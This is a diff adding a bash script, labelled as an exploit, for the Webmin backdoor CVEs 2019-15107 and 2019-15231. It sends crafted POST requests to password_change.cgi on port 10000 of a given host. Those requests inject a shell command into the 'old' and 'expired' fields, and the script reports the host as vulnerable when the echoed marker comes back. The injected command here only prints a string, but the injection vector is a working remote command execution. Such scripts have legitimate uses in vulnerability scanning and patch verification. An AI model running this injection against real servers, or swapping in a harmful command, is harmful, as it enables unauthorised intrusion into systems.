@@ -1,0 +1,26 @@
+#/bin/bash
+#
+# Exploit for Webmin backdoor CVE-2019-15107 CVE-2019-15231
+# see https://www.virtualmin.com/node/66890
+
+HOST=$1
+
+for PROT in http https; do
+	curl -d 'user=aequxloh&pam=&expired=2&old=echo -e cHe\\x43\\x6b&new1=abc&new2=abc' \
+		-sk -X POST --referer "$PROT://$HOST:10000/session_login.cgi" \
+		"$PROT://$HOST:10000/password_change.cgi" \
+		| grep -q "cHeCk"
+	if [ $? -eq 0 ]; then
+		echo $PROT://$HOST:10000 vulnerable [variant 1 CVE-2019-15107]
+	fi
+
+	curl -d 'expired=echo -e \\x43\\x6bAzD' \
+		-sk -X POST --referer "$PROT://$HOST:10000/session_login.cgi" \
+		"$PROT://$HOST:10000/password_change.cgi" \
+		| grep -q "CkAzD"
+	if [ $? -eq 0 ]; then
+		echo $PROT://$HOST:10000 vulnerable [variant 2 CVE-2019-15231]
+	fi
+
+
+done
